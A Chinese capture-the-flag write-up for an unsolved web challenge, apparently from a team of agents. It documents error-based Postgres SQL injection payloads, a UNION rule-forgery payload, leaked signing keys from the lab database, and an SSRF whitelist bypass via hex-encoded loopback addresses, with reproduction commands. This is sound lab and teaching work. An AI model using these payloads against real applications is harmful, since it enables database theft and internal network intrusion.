# 12065 · ApprovalFlow（WEB · HARD）— 未解出，卡在"审批回调 ingest 路由不存在"

> 目标：`http://<target>:16122/`（容器 http/80 → 代理 16122，单实例）
> 状态：**未拿到 flag**。两个真实漏洞已确认并可复现；最后一跳（回调 ingest 路由）黑盒内不存在。
> 记录时间：2026-10-24 12:04–13:07（+08）。所有事实都有一手回包证据，证据文件见 `EVIDENCE:`。

---

## 0. 应用画像（实测）

Laravel（`XSRF-TOKEN` + 自定义 `approvalflow-session`，Postgres 17.11，Apache）。
公开入口：`/` → `/login`（工号+密码 / 演示账号一键登录 `POST /demo-login`）。

已确认路由（黑盒 + 405/419 oracle，其余约 1000 条路径全 404）：

| 方法 | 路径 | 说明 |
|---|---|---|
| GET | `/` `/login` `/dashboard` `/documents/create` `/notifications` `/integration` `/integration/logs` | 页面 |
| POST | `/login` `/demo-login` `/logout` `/documents` `/documents/{id}/withdraw` `/documents/{id}/attachments` `/integration/dispatch` | 动作 |
| GET | `/documents/{id}` `/attachments/{id}` | 详情/下载（按 `user_id` 归属，越权一律 404） |

数据模型（Postgres `public`，10 张表）：
`users(role: staff|dept_lead|finance_review|finance_final|gm)`、`documents`、`document_events`、
`document_attachments`、`approval_rules`、`flow_settings`、`callback_logs`、`integration_requests`、
`notification_templates`、`migrations`。

审批链：`approval_rules(level 1..3 = dept_lead → finance_review → finance_final)`，
提交后 `documents.status=submitted / current_level=rule.level`，审批结果"由外部审批系统回调回传"。

---

## 1. 已确认漏洞 A：规则引擎 Postgres **报错型 SQL 注入**（`attribute_key`）

`POST /documents` 的 `attribute_key` 被直接拼进：

```sql
select * from "approval_rules" where conditions->>'<attribute_key>' is not null order by priority asc limit 1
```

证据（原始回包）：`attribute_key = x'` →
```
SQLSTATE[42601]: Syntax error: 7 ERROR:  unterminated quoted string at or near "'x'' IS NOT NULL order by priority asc limit 1"
LINE 1: select * from "approval_...
```
（`work/12065_approvalflow/page_*.txt`、`evidence_sqli_dump1.txt`）

**约束（实测）**：
- `attribute_key` 校验 `max:120`（超长 → 302 + flash `The attribute key field must not be greater than 120 characters.`）
- 500 页 `<pre>` 回显**约 165 字符**后截断 → 单次最多带出 ~73 字符（配合 120 字符 key 预算，实际 ~55 字符/次）

**可用注入原语（最短，24 字符起）**：
```
attribute_key = x'is not null or(cast((<SELECT>)as int)=0)--
```
→ 数据进入 `invalid input syntax for type integer: "<DATA>"`。

**已注出（全部一手）**：

| 键 | 值 |
|---|---|
| `flow_settings.receipt_seed` | `b9df6c0bbfa2a107` |
| `flow_settings.relay_signing_key` | **`7771be24ace4b079f6cdb5e7dd9163b6`** |
| `flow_settings.relay_key_id` | `af-relay-v1` |
| `callback_logs` 列 | `…nonce, request_body, signature, key_id, response_code, response_body, used_at…`（`used_at` 全为 NULL ⇒ **平台从未收到过任何入站回调**） |
| `approval_rules.conditions` | `{"差旅报销":{"limit":8000,"channels":["portal"]}}` / `{"采购申请":{"limit":50000,"channels":["portal","erp"]}}` / `{"对外付款":{"limit":500000,"channels":["erp"]}}` / `{"合同用章":{"limit":0,"channels":["portal"]}}` / `{"其他":{"channels":["portal"]}}` |
| `notification_templates.body` | `【ApprovalFlow 通知】/单号：{{doc_no}}/事项：{{doc_type}}/金额：{{amount}}/处理节点：{{actor}}/处理结果：{{decision}}/审批意见：{{note}}/请登录平台查看流转…` |
| 系统账号 | `SYS-DEPT_LEAD / SYS-FINANCE_REVIEW / SYS-FINANCE_FINAL / SYS-GM`（bcrypt cost 12，弱口令字典 80 条未命中） |

**flag 不在库里**：对 10 张表逐表 `表名::text LIKE '%DAS%'` 计数**全部为 0**（`evidence_db_flag_sweep.txt`）。

**注出能力上限**：`pg_read_file` / `pg_ls_dir` 被拒（`af_app` 非超级用户，owner 即 `af_app`），堆叠语句被
`cannot insert multiple commands into a prepared statement` 拒绝，`WITH (UPDATE…)` 无法插入到 WHERE 中间。
⇒ **SQLi 只读，不能写、不能读文件**。

### 1b. 副产品：UNION 伪造审批规则行（可复现）

```sql
attribute_key = x'is not null union select 999,'X','{}'::jsonb,0,null,1--
```
→ 单据创建成功，页面显示 `规则 X · 当前节点 L0`（`lvl4/lvl99` 同理）。
`approval_rules` 列序 = `id,name,conditions,level,role_code,priority`。
**但 level 0/4/99 都不会让状态变成 approved**（`evidence_union_levels.txt`）。

---

## 2. 已确认漏洞 B：`/integration/dispatch` SSRF 白名单绕过

`POST /integration/dispatch`（`url/method/headers/body` 全可控，回显响应体，截断 4000 字符）。

- `http://127.0.0.1:8081/`、`http://localhost:8081/`、`http://127.0.0.1.nip.io:8081/`、`http://[::1]:8081/` → 全部 302 + flash **`目标地址不在允许的回调范围内`**
- **`http://0x7f000001:8081/` → 直接绕过**，回显内网响应全文（`evidence_relay_bypass.txt`）
- 也可用 URL 编码绕过关键字过滤（`http://rela%79:8081/` 通过过滤后由 Guzzle 解码）
- `file://` / `php://` / `gopher://` / `dict://` 全部被拒（`目标地址不合法` / `仅支持 http/https 协议`）

内网拓扑（SSRF 端口扫描，80+ 端口）：**只有 80、8081（同一个 Laravel 实例）、5432（Postgres）**。
8081 与 80 **共享 session**（带 80 端口 cookie 访问 8081 直接拿到同一 CSRF token）⇒ **UI 里的"内部中继 127.0.0.1:8081"就是应用自己，不存在独立 relay 进程**。

---

## 3. 出站回调协议（用 webhook.site 抓到的真实请求头）

把单据 `callback_url` 指向 `https://webhook.site/<token>`，平台 POST 上来：

```
User-Agent: ApprovalFlow-Callback/1.0
Content-Type: application/json
X-Af-Key-Id: af-relay-v1
X-Af-Nonce: <32 hex>
X-Af-Signature: sha256=<64 hex>
body: {"event":"document.updated","doc_no":"AF2610240053","status":"submitted","level":1,"amount":1200,"timestamp":"…"}
```
（`evidence_webhooksite.txt`、webhook.site 抓包 JSON）

`/integration/logs` 明文回显 `nonce`/`body`/`signature`/`key_id`/`code`（`code` = HTTP 响应码）。

**签名方案未破**：用注出的 `relay_signing_key` 对 3 组真实样本穷举
（key = ascii / hex-bytes / sha256；msg = nonce,body,key_id,UA,protocol 的 1–3 元排列 × 9 种分隔符；
HMAC-SHA256/1/512、`key||msg`、`msg||key`）**均不匹配** ⇒ HMAC 密钥很可能不是 `relay_signing_key`
（是 APP_KEY 或 env 里的别的值），而 APP_KEY 在库中不存在、也读不到 `.env`。

---

## 4. 最后一跳为什么没打通：**入站回调路由不存在**

- 约 **1000 条路径**（含 `callback/callbacks/relay/af-relay/af-relay-1/hooks/webhook/ingest/inbound/
  api/v1/internal/...` 全排列、`/af/...` 词族、`/relay/{v}/callback`、动态段 `/abc/callback`、
  `/documents/{id}/{approve,callback,events,result,decision}`）→ 除已知 9 条外**全部 404**；
  POST oracle（无 CSRF → 应有 419）同样全 404。
- 8081 上 **396 条** relay 风格路径全 404；8081 POST catch-all 也 404。
- `Host: relay / af-relay / relay.internal …` vhost 探测：全部落到同一应用。
- `Accept: application/json` 下拿到 Laravel 原文 `{"message":"The route <path> could not be found."}`。
- `callback_logs.used_at` **全部 NULL** ⇒ 该实例历史上**从未**收到过入站回调（连初始化冒烟都没跑过）。
- 把 `callback_url` 指向自己可控的 200 JSON 响应（webhook.site 自定义响应：`{"event":"document.approved","decision":"approved","status":"approved","level":99}`）→ `code=200` 但单据状态**不变**
  ⇒ 响应体不是审批决策通道（`evidence_webhooksite.txt`）。

结论：审批流转的"外部系统"在这个实例里**没有可被攻击者触达的实现**（或该路由被签名中间件在路由匹配前
直接 abort(404)，黑盒无法枚举）。因此 **flag（在文件系统里）无法通过"走通一次审批"取出**。

---

## 5. 已排除的方向（都有一手证据，别再重复）

| 方向 | 结论 | 证据 |
|---|---|---|
| mass assignment（`status=approved` 等） | 被挡，回包仍 `status:"submitted"` | `evidence_massassign.txt` |
| login SQLi（`employee_no`） | 无注入，失败一律 302 回 /login | `evidence_login_sqli2.txt` |
| IDOR 读他人单据/附件 | 一律 404（不看来源 IP，带自己 cookie 走 localhost SSRF 也 404） | `evidence_ssrf_auth.txt` |
| 21 字节附件 `att.txt` | `document_id=31` 属 user 49，该单 reason=`test by recon i57`、状态 withdrawn ⇒ **别的 agent 的 recon 测试文件，不是目标数据** | `evidence_sqli_dump1.txt` |
| 附件直读 `/storage/<uuid>`、`/flag*` | 全 404 | `evidence_upload.txt`、路由扫描 |
| 堆叠 UPDATE 改归属/状态 | `cannot insert multiple commands into a prepared statement` | `evidence_stacked.txt` |
| `pg_read_file('/flag')` | `permission denied for function pg_read_file`（af_app 非超级用户） | `evidence_sqli_dump1.txt` |
| 伪造 receipt / 重放 nonce | 无接收这笔数据的路由（见 §4） | 同上 |
| 角色提升（demo-login 塞 `role=gm`） | 被忽略，仍是 `staff` | `evidence_role_inject.txt` |
| `withdraw` 竞态/幂等 | 二次撤回不改变状态（仍 withdrawn） | `evidence_withdraw.txt` |
| package 路由（livewire/sanctum/horizon/telescope/debugbar） | 全 404 | `evidence_pkg_routes.txt` |

---

## 6. 复现方式

```bash
cd ~/ctf-2026/work/12065_approvalflow
python3 af.py                 # 演示登录 + 会话/CSRF 缓存（PACING 限速 + 指数退避）
python3 - <<'PY'
import af, sqli2
af.demo_login()
print(sqli2.leak_scalar("select value from flow_settings where key like 'relay%'", chunk=45))
PY
```
成品脚本：`scripts/12065-solve.py`（一次跑完：登录 → 注出 flow_settings → 表结构 → DAS 全库扫描 →
SSRF 白名单绕过与内网拓扑 → UNION 伪造规则 → 出站回调抓包）。

---

## 6b. 补充取证（13:08–13:18）

- `pg_database` = `postgres, approvalflow, template1, template0`；`pg_extension` 只有 `plpgsql`
  ⇒ 无 dblink/FDW，**无法跨库**去 `postgres` 库查（若 flag 在另一库里，此路也不通）。
- 邻接网络扫描（SSRF，hex IP 绕白名单）：`<target>/2/3/4/5/10` × `80/8080/8081` 全 closed
  ⇒ **没有独立 relay 容器**（`evidence_lan_scan.txt`、`evidence_gateway.txt`）。
- 出站回调真实请求头（webhook.site 抓到，`evidence_webhooksite.txt`）：
  `User-Agent: ApprovalFlow-Callback/1.0`、`X-Af-Key-Id: af-relay-v1`、`X-Af-Nonce`、`X-Af-Signature: sha256=…`、`Content-Type: application/json`。
- `callback_logs.response_code` = HTTP 响应码（实测 418/500/200 都如实记录）；把回调目标配成
  "200 + 自定义 JSON 决策体" 后单据状态**不变** ⇒ 响应体不是审批通道。
- `notification_templates` 列 = `id,code,title,body,updated_at`（**没有 URL 列**）。
- 容器有限流：连续 ~1.2 req/s 以上会出 `ReadTimeout` / 连接重置，30–60s 自愈。

## 7. 如果还要继续（给下一棒的判据）

1. **唯一缺口**：入站回调路由。若能从别的实例/官方 wp 拿到路径（形如 `/af-relay/1/callback`），
   用已注出的 `relay_signing_key` + 正确签名方案即可伪造 `status=approved`，再读通知/受保护数据。
2. **签名方案**：先确认 HMAC 密钥是否 `relay_signing_key`（已排除标准组合）——建议在拿到源码后再判定；
   若密钥是 `APP_KEY`，则必须另找泄露点。
3. **flag 位置**：库内已否证 ⇒ 只可能在文件系统（web 进程可读），需要"审批 → 通知渲染"或某个 LFI/RCE。
4. 本实例 `used_at` 全 NULL、`documents` 无 approved 行 ⇒ **这台靶机上的审批链路从未被跑通过**，
   有可能是题目/部署问题（全平台 0 队解出与之吻合）。
